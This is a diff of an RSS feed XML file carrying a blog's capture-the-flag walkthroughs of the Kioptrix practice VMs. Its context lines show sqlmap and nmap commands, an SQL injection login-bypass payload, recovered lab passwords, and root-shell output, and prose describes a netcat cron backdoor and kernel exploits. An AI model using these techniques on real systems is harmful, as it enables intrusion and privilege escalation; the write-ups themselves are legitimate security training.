@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Kioptrix on rastamouse.me</title>
-    <link>https://rastamouse.me/tags/kioptrix/</link>
-    <description>Recent content in Kioptrix on rastamouse.me</description>
+    <title>kioptrix on rastamouse.me</title>
+    <link>https://rastamouse.me/tags/kioptrix/index.xml</link>
+    <description>Recent content in kioptrix on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 25 Apr 2014 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/tags/kioptrix/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
@@ -15,11 +14,11 @@
       <pubDate>Fri, 25 Apr 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/kioptrix-2014/</guid>
-      <description>
+      <description>&lt;p&gt;After a 2 year (hiatus?) since the last Kioptrix VM challenge, loneferret has released Kioptrix 2014.  This is still an &amp;lsquo;entry level&amp;rsquo; challenge, though it does have some interesting spins typical of loneferret&amp;rsquo;s style of VM challenges.  The goal of the challenge is to obtain the flag.&lt;/p&gt;
 
-&lt;p&gt;After a 2 year (hiatus?) since the last Kioptrix VM challenge, loneferret has released Kioptrix 2014.  This is still an &amp;lsquo;entry level&amp;rsquo; challenge, though it does have some interesting spins typical of loneferret&amp;rsquo;s style of VM challenges.  The goal of the challenge is to obtain the flag.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.1.125
 
@@ -36,7 +35,7 @@ OS CPE: cpe:/o:freebsd:freebsd:9
 OS details: FreeBSD 9.0-RELEASE
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;nikto-wfuzz:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;Nikto, Wfuzz&lt;/h2&gt;
+&lt;h2 id=&#34;nikto-wfuzz&#34;&gt;Nikto, Wfuzz&lt;/h2&gt;
 
 &lt;p&gt;Since only web services are available, nikto and wfuzz seemed like a good place to start.&lt;/p&gt;
 
@@ -55,7 +54,7 @@ root@kali:~# wfuzz -c -zfile,/usr/share/wfuzz/wordlist/general/common.txt --hc 4
 
 &lt;p&gt;This gives away the presence of another webapp.  Typing the address in manually takes you to &lt;code&gt;pChart 2.1.3&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;pchart:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;pChart&lt;/h2&gt;
+&lt;h2 id=&#34;pchart&#34;&gt;pChart&lt;/h2&gt;
 
 &lt;div align=&#34;center&#34;&gt;
 	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
@@ -104,7 +103,7 @@ Directory &amp;quot;/usr/local/www/apache22/data2&amp;quot;
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;phptax:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;phpTax&lt;/h2&gt;
+&lt;h2 id=&#34;phptax&#34;&gt;phpTax&lt;/h2&gt;
 
 &lt;p&gt;More research told me that this application was vulnerable to RCE - at last something that would help me get a shell!&lt;/p&gt;
 
@@ -137,7 +136,7 @@ cmd.php data drawimage.php files icons.inc index.php maps pictures readme shell.
 
 &lt;p&gt;&lt;code&gt;192.168.1.125:8080/phptax/shell.php&lt;/code&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;privilege-escalation:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
 
 &lt;p&gt;It turned out that escalating myself to root was relatively simple.  I found a &lt;a href=&#34;http://www.exploit-db.com/exploits/28718/&#34;&gt;suitable kernel exploit&lt;/a&gt; and transfered it across using &lt;code&gt;netcat&lt;/code&gt;.  Compiled and ran:&lt;/p&gt;
 
@@ -157,8 +156,7 @@ uid=0(root) gid=0(wheel) groups=0(wheel)
 cat congrats.txt
 If you are reading this, it means you got root (or cheated).
 Congratulations either way...
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -167,11 +165,11 @@ Congratulations either way...
       <pubDate>Wed, 23 Jan 2013 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2013/kioptrix-level-1-2/</guid>
-      <description>
+      <description>&lt;p&gt;This is a walkthough of how I completed the Kioptrix Level 1.2.  The goal of this challenge is to collect the flag.&lt;/p&gt;
 
-&lt;p&gt;This is a walkthough of how I completed the Kioptrix Level 1.2.  The goal of this challenge is to collect the flag.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- kioptrix3.com
 
@@ -185,7 +183,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Ligoat Security - Got Goat? Security ...
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;lotuscms:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;LotusCMS&lt;/h2&gt;
+&lt;h2 id=&#34;lotuscms&#34;&gt;LotusCMS&lt;/h2&gt;
 
 &lt;p&gt;This little website is powered by LotusCMS, which is vulnerable to remote code execution.  However, I wasn&amp;rsquo;t having much luck with anything other than the exploit in the Metasploit Framework.  Since I don&amp;rsquo;t like to rely on this, I pressed on to find another route in.&lt;/p&gt;
 
@@ -198,7 +196,7 @@ dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
 
 &lt;p&gt;I actually decided to hold off on bruteforcing their SSH logins.  It was my assumption that at this level of challenge, the password would be too complex to bruteforce in a reasonable amount of time.&lt;/p&gt;
 
-&lt;h2 id=&#34;gallery:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;Gallery&lt;/h2&gt;
+&lt;h2 id=&#34;gallery&#34;&gt;Gallery&lt;/h2&gt;
 
 &lt;p&gt;One of the blog posts referes to a new gallery application at kioptrix3.com/gallery.&lt;/p&gt;
 
@@ -215,7 +213,7 @@ dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
 
 &lt;p&gt;&lt;code&gt;kioptrix3.com/gallery/gallery.php?id=&lt;/code&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;sqlmap:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;SQLMap&lt;/h2&gt;
+&lt;h2 id=&#34;sqlmap&#34;&gt;SQLMap&lt;/h2&gt;
 
 &lt;p&gt;I plugged the URL into SQLMap and it confirmed the vulnerability.&lt;/p&gt;
 
@@ -256,7 +254,7 @@ admin:n0t7t1k4
 
 &lt;p&gt;My original intent was to use the admin password for Gallarific and attempt to upload a PHP backdoor.  However, I first decided to try the two passwords from the dev_accounts with SSH.&lt;/p&gt;
 
-&lt;h2 id=&#34;ssh:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;SSH&lt;/h2&gt;
+&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
 
 &lt;p&gt;I was able to login as &lt;code&gt;loneferret&lt;/code&gt; with the password &lt;code&gt;starwars&lt;/code&gt; (blew my original SSH theory out of the water).&lt;/p&gt;
 
@@ -290,8 +288,7 @@ loneferret@Kioptrix3:~$ sudo /bin/bash
 
 root@Kioptrix3:~# id
 uid=0(root) gid=0(root) groups=0(root)
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -300,11 +297,11 @@ uid=0(root) gid=0(root) groups=0(root)
       <pubDate>Wed, 23 Jan 2013 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2013/kioptrix-level-1-3/</guid>
-      <description>
+      <description>&lt;p&gt;This is a walkthrough of how I completed the Kioptrix Level 1.3 challenge.  The goal is to find the flag.&lt;/p&gt;
 
-&lt;p&gt;This is a walkthrough of how I completed the Kioptrix Level 1.3 challenge.  The goal is to find the flag.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.1.124
 
@@ -336,7 +333,7 @@ Host script results:
 |_smbv2-enabled: Server doesn&#39;t support SMBv2 protocol
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;liggoat-login:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;LigGoat Login&lt;/h2&gt;
+&lt;h2 id=&#34;liggoat-login&#34;&gt;LigGoat Login&lt;/h2&gt;
 
 &lt;p&gt;I visited the web page takes you to a LigGoat login page.&lt;/p&gt;
 
@@ -344,7 +341,7 @@ Host script results:
 
 &lt;p&gt;This suggests that the password field is vulnerable, so to do the heavy lifting, I used &lt;code&gt;sqlmap&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;sqlmap:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;SQLMap&lt;/h2&gt;
+&lt;h2 id=&#34;sqlmap&#34;&gt;SQLMap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=1&amp;quot; -p mypassword
 &lt;/code&gt;&lt;/pre&gt;
@@ -383,7 +380,7 @@ root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myus
 
 &lt;p&gt;A few interesting bits of information there&amp;hellip;&lt;/p&gt;
 
-&lt;h2 id=&#34;ssh:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;SSH&lt;/h2&gt;
+&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
 
 &lt;p&gt;In the previous challenge, information I obtained from a database allowed me to SSH into the system - so I tried this again with john and robert.
 I was able to login with both usernames and passwords, but each user was dropped into a limited shell of some description.&lt;/p&gt;
@@ -413,7 +410,7 @@ john@Kioptrix4:~$
 
 &lt;p&gt;Another stroke of luck!&lt;/p&gt;
 
-&lt;h2 id=&#34;mysql:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;MySQL&lt;/h2&gt;
+&lt;h2 id=&#34;mysql&#34;&gt;MySQL&lt;/h2&gt;
 
 &lt;p&gt;I first made sure I could connect to MySQL as root, without a password.&lt;/p&gt;
 
@@ -440,7 +437,7 @@ john@Kioptrix4:~$ ls -l /test
 
 &lt;p&gt;This shows that I can write to the filesystem, but more importantly, as the root user.&lt;/p&gt;
 
-&lt;h2 id=&#34;cron:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;Cron&lt;/h2&gt;
+&lt;h2 id=&#34;cron&#34;&gt;Cron&lt;/h2&gt;
 
 &lt;p&gt;I thought I could then use this to write a new job into &lt;code&gt;cron&lt;/code&gt;, to automate a &lt;code&gt;netcat&lt;/code&gt; connection to my IP.  Since I can write as root, I can ensure the resulting shell is run with root privileges.&lt;/p&gt;
 
@@ -470,7 +467,7 @@ Congratulations!
 You&#39;ve got root.
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;epilogue:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;Epilogue&lt;/h2&gt;
+&lt;h2 id=&#34;epilogue&#34;&gt;Epilogue&lt;/h2&gt;
 
 &lt;p&gt;Getting the &lt;code&gt;cron&lt;/code&gt; to work took a good amount of time - I thought I was getting the syntax incorrect.  I checked the running processes and saw more than a few instances of &lt;code&gt;netcat&lt;/code&gt; running, but the connections weren&amp;rsquo;t reaching me.&lt;/p&gt;
 
@@ -495,8 +492,7 @@ DROP       tcp  --  anywhere             anywhere            tcp dpts:webmin:313
 DROP       tcp  --  anywhere             anywhere            tcp dpt:webcache 
 DROP       tcp  --  anywhere             anywhere            tcp dpt:www 
 DROP       tcp  --  anywhere             anywhere            tcp dpt:ftp
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -505,11 +501,11 @@ DROP       tcp  --  anywhere             anywhere            tcp dpt:ftp
       <pubDate>Mon, 21 Jan 2013 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2013/kioptrix-level-1-1/</guid>
-      <description>
+      <description>&lt;p&gt;This is a walkthrough of how I completed Kioptrix Level 1.2.  The goal of the challenge is to obtain the flag.&lt;/p&gt;
 
-&lt;p&gt;This is a walkthrough of how I completed Kioptrix Level 1.2.  The goal of the challenge is to obtain the flag.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:9a8c984df175a5e455bd837f325e544a&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/kioptrix/2# nmap -n -sV -A -p- 192.168.1.121
 
@@ -558,7 +554,7 @@ PORT     STATE SERVICE  VERSION
 3306/tcp open  mysql    MySQL (unauthorized)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;sql-injection-login-bypass:9a8c984df175a5e455bd837f325e544a&#34;&gt;SQL Injection Login Bypass&lt;/h2&gt;
+&lt;h2 id=&#34;sql-injection-login-bypass&#34;&gt;SQL Injection Login Bypass&lt;/h2&gt;
 
 &lt;p&gt;I went and had a look at the Apache service running on port 80, and was greated with a login page.&lt;/p&gt;
 
@@ -588,7 +584,7 @@ Password: &#39; or &#39;1&#39;=&#39;1
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;command-injection:9a8c984df175a5e455bd837f325e544a&#34;&gt;Command Injection&lt;/h2&gt;
+&lt;h2 id=&#34;command-injection&#34;&gt;Command Injection&lt;/h2&gt;
 
 &lt;p&gt;Entering &lt;code&gt;127.0.0.1&lt;/code&gt; in this box give me the expected output.&lt;/p&gt;
 
@@ -611,7 +607,7 @@ drwxr-xr-x  8 root root 4096 Oct  7  2009 ..
 -rwxr-Sr-t  1 root root  199 Oct  8  2009 pingit.php
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;exploring-mysql:9a8c984df175a5e455bd837f325e544a&#34;&gt;Exploring MySQL&lt;/h2&gt;
+&lt;h2 id=&#34;exploring-mysql&#34;&gt;Exploring MySQL&lt;/h2&gt;
 
 &lt;p&gt;I used the shell to read &lt;code&gt;index.php&lt;/code&gt;, which was the original paged used to login, and obtain the username and password it uses to connect to the database.  I spent some time exploring the databases within.&lt;/p&gt;
 
@@ -627,7 +623,7 @@ mysql --user=john --password=hiroshima -e &amp;quot;use webapp; show tables;&amp
 mysql --user=john --password=hiroshima -e &amp;quot;use webapp; select * from users;&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;privilege-escalation:9a8c984df175a5e455bd837f325e544a&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
 
 &lt;p&gt;In the end, I found a local kernel exploit that worked nicely in elevating my shell to root.  I transfered the exploit by hosting it on my own apache server and using &lt;code&gt;wget&lt;/code&gt;.  It was then compiled with &lt;code&gt;gcc&lt;/code&gt; and run.&lt;/p&gt;
 
@@ -637,8 +633,7 @@ gcc x.c -o x
 sh-3.00# id
 uid=0(root) gid=0(root) groups=48(apache)
 sh-3.00# cat /root/.mysql_history
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -647,11 +642,11 @@ sh-3.00# cat /root/.mysql_history
       <pubDate>Sun, 20 Jan 2013 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2013/kioptrix-level-1/</guid>
-      <description>
+      <description>&lt;p&gt;This is a walkthrough of how I completed Kioptrix Level 1.  The goal is to obtain the flag.&lt;/p&gt;
 
-&lt;p&gt;This is a walkthrough of how I completed Kioptrix Level 1.  The goal is to obtain the flag.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:89aaf23838ef9c8ff34cb30ba3b2c2a1&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.1.123
 
@@ -698,7 +693,7 @@ PORT      STATE SERVICE     VERSION
 |_  100024  1          32770/udp  status
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;smbclient:89aaf23838ef9c8ff34cb30ba3b2c2a1&#34;&gt;SMBClient&lt;/h2&gt;
+&lt;h2 id=&#34;smbclient&#34;&gt;SMBClient&lt;/h2&gt;
 
 &lt;p&gt;The nmap scan showed that the Samba service was running, I used SMBClient to establish a NULL session.  This allowed me to see the available shares and the Samba version (2.2.1a).&lt;/p&gt;
 
@@ -721,7 +716,7 @@ Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
 
 &lt;p&gt;This is vulnerable to a buffer overflow in the &lt;code&gt;call_trans2open&lt;/code&gt; function in &lt;code&gt;trans2.c&lt;/code&gt;, for which there are many exploits available.  Some are more reliable others however.&lt;/p&gt;
 
-&lt;h2 id=&#34;0x333hate:89aaf23838ef9c8ff34cb30ba3b2c2a1&#34;&gt;0x333hate&lt;/h2&gt;
+&lt;h2 id=&#34;0x333hate&#34;&gt;0x333hate&lt;/h2&gt;
 
 &lt;p&gt;The exploit which worked well for me was the &lt;code&gt;0x333hate&lt;/code&gt; varient, downloaded from SecurityFocus.  After compiling and running the exploit, I was granted with a root shell.&lt;/p&gt;
 
@@ -739,14 +734,13 @@ Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
 uid=0(root) gid=0(root) groups=99(nobody)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag:89aaf23838ef9c8ff34cb30ba3b2c2a1&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;p&gt;After searching through the system, I eventually found the flag in &lt;code&gt;/var/spool/mail&lt;/code&gt;.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;If you are reading this, you got root. Congratulations.
 Level 2 won&#39;t be as easy...
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
   </channel>
